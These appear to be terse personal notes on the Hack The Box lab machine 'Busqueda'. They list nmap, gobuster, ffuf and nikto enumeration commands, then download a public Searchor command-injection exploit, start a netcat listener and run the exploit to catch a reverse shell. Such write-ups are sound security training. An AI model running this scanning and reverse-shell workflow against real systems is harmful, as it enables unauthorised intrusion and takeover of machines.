Busqueda
========================

## Enumeration

    sudo nmap_enum busqueda.htb | tee nmap_output.txt

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn busqueda.htb | tee nmap_udp_output.txt
    
    sudo nmap -p- -Pn -T5 -n busqueda.htb | tee nmap_fullportstcp_output.txt
    
    sudo nmap -sS --script vuln -n -T5 -Pn busqueda.htb -p 22,80 | tee nmap_vulns.txt
    
![qownnotes-media-ojmvSr](../../../media/qownnotes-media-ojmvSr.png)

URL Enumeration

    gobuster dir -u http://searcher.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_gobuster.txt"
    
    gobuster dir -u http://searcher.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -t 16 -o "tcp_port_protocol_ext_gobuster.txt"
    
    gobuster dir -u http://searcher.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_ext_gobuster.txt"
    
![qownnotes-media-ETkRVo](../../../media/qownnotes-media-ETkRVo.png)


Subdomain enumeration

    ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.busqueda.htb" -u http://busqueda.htb -fw 18
    
    ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.searcher.htb" -u http://searcher.htb -fw 18
    
![qownnotes-media-OIlJFa](../../../media/qownnotes-media-OIlJFa.png)

site scan

    nikto -host http://searcher.htb -T x 6 | tee nikto_output.txt
    
    nikto -host http://busqueda.htb -T x 6 | tee nikto_output.txt
    
![qownnotes-media-gEpYjc](../../../media/qownnotes-media-gEpYjc.png)

    httrack http://searcher.htb
    cat new.txt | cut -f 8
 
 ![qownnotes-media-bNPaGH](../../../media/qownnotes-media-bNPaGH.png)

    searchsploit Werkzeug
    
![qownnotes-media-nndZzn](../../../media/qownnotes-media-nndZzn.png)

## Exploitation

![qownnotes-media-WLUVVW](../../../media/qownnotes-media-WLUVVW.png)

    wget https://raw.githubusercontent.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/main/exploit.sh
    
    chmod +x exploit.sh
    nc -nlvp 8081
    ./exploit.sh searcher.htb 10.10.14.17 8081

![qownnotes-media-lCEvaF](../../../media/qownnotes-media-lCEvaF.png)


![qownnotes-media-XbxKsi](../../../media/qownnotes-media-XbxKsi.png)

